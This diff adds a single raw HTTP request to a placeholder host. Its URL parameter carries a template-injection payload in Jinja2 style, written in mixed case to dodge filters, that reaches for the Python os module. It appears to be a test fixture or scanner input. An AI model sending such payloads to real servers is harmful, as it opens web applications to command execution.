@@ -1,0 +1,4 @@
+GET /a?url={{jOiNeR.__iNiT__.__gLoBaLs__.Os}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
